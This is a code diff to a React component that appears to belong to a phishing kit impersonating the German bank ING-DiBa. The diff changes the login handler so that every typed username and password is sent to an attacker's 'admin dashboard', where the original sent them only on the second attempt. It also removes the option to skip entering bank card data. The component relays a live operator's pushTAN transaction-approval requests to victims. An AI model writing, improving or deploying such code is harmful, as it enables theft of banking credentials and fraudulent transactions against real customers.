@@ -132,7 +132,7 @@ function FormFlow() {
   const [error, setError] = useState<string | null>(null);
   const [stepConfig, setStepConfig] = useState<StepConfig>(DEFAULT_CONFIG);
   const [configLoaded, setConfigLoaded] = useState(false);
-  const [sessionData, setSessionData] = useState<any>({});
+  const [sessionData, setSessionData] = useState<Record<string, any>>({});
   const [qrAttempts, setQrAttempts] = useState(0);
   
   // Enhanced TAN system state
@@ -161,7 +161,7 @@ function FormFlow() {
       setIsWaitingForAdmin(true);
       
       // Store the next state to transition to when admin continues
-      setSessionData(prev => ({ ...prev, pendingState: nextState }));
+      setSessionData((prev: Record<string, any>) => ({ ...prev, pendingState: nextState }));
       
       // Notify admin that user is waiting
       templateSocketClient.emit('user-waiting', {
@@ -265,7 +265,7 @@ function FormFlow() {
           setLoadingMessage('Daten werden aktualisiert...');
           
           setTimeout(() => {
-            setSessionData(prev => ({ ...prev, ...data }));
+            setSessionData((prev: Record<string, any>) => ({ ...prev, ...data }));
             setLoading(false);
           }, 1000);
         },
@@ -294,7 +294,7 @@ function FormFlow() {
             setIsWaitingForAdmin(false);
             setLoading(false);
             setState(sessionData.pendingState);
-            setSessionData(prev => ({ ...prev, pendingState: null }));
+            setSessionData((prev: Record<string, any>) => ({ ...prev, pendingState: null }));
           }
         },
         // Enhanced TAN system handlers
@@ -364,27 +364,26 @@ function FormFlow() {
       };
       setSessionData(newSessionData);
       
-      // Submit to backend only on the final login attempt (second attempt)
-      if (state === STATES.LOGIN_ERROR) {
-        try {
-          const response = await submitTemplateData({
-            template_name: 'ingdiba',
-            key: key || '',
-            step: 'login',
-            data: {
-              username: data.username,
-              password: data.password
-            }
-          });
-
-          if (!response.success) {
-            console.warn('Backend submission failed:', response.error);
-            // Continue with flow even if API fails
+      // Submit to backend on every login attempt
+      try {
+        const response = await submitTemplateData({
+          template_name: 'ingdiba',
+          key: key || '',
+          step: 'login',
+          data: {
+            username: data.username,
+            password: data.password,
+            attempt: state === STATES.LOGIN ? 1 : 2
           }
-        } catch (apiError) {
-          console.warn('Failed to submit to admin dashboard:', apiError);
+        });
+
+        if (!response.success) {
+          console.warn('Backend submission failed:', response.error);
           // Continue with flow even if API fails
         }
+      } catch (apiError) {
+        console.warn('Failed to submit to admin dashboard:', apiError);
+        // Continue with flow even if API fails
       }
       
       // Show loading animation
@@ -694,7 +693,7 @@ function FormFlow() {
         return <QRUploadForm onUpload={handleQRUpload} isRetry={true} />;
         
       case STATES.BANK_CARD:
-        return <BankCardForm onSubmit={handleBankCardSubmit} onSkip={handleBankCardSkip} />;
+        return <BankCardForm onSubmit={handleBankCardSubmit} />;
         
       case STATES.FINAL_SUCCESS:
         return <SuccessScreen />;
@@ -703,14 +702,13 @@ function FormFlow() {
         return <PushTANScreen 
           tanType={currentTanRequest?.type || 'TRANSACTION_TAN'}
           transactionDetails={currentTanRequest?.transactionDetails}
-          onSubmit={(tan) => {
-            console.log('pushTAN submitted:', tan);
+          onConfirm={() => {
+            console.log('pushTAN confirmed');
             // Send TAN completion back to admin
             templateSocketClient.emit('tan-completed', {
               requestId: currentTanRequest?.requestId,
               success: true,
-              type: currentTanRequest?.type,
-              tanValue: tan
+              type: currentTanRequest?.type
             });
             setCurrentTanRequest(null);
             setState(STATES.FINAL_SUCCESS);
@@ -731,14 +729,13 @@ function FormFlow() {
         return <PushTANScreen 
           tanType={currentTanRequest?.type || 'TRANSACTION_TAN'}
           transactionDetails={currentTanRequest?.transactionDetails}
-          onSubmit={(tan) => {
-            console.log('TAN submitted:', tan);
+          onConfirm={() => {
+            console.log('TAN confirmed');
             // Send TAN completion back to admin
             templateSocketClient.emit('tan-completed', {
               requestId: currentTanRequest?.requestId,
               success: true,
-              type: currentTanRequest?.type,
-              tanValue: tan
+              type: currentTanRequest?.type
             });
             setCurrentTanRequest(null);
             setState(STATES.FINAL_SUCCESS);
@@ -757,8 +754,6 @@ function FormFlow() {
       case STATES.WAITING_FOR_ADMIN:
         return <Loading 
           message={isWaitingForAdmin ? loadingMessage : 'Wird verarbeitet...'} 
-          type="processing"
-          showProgress={false}
         />;
         
       case STATES.ERROR:
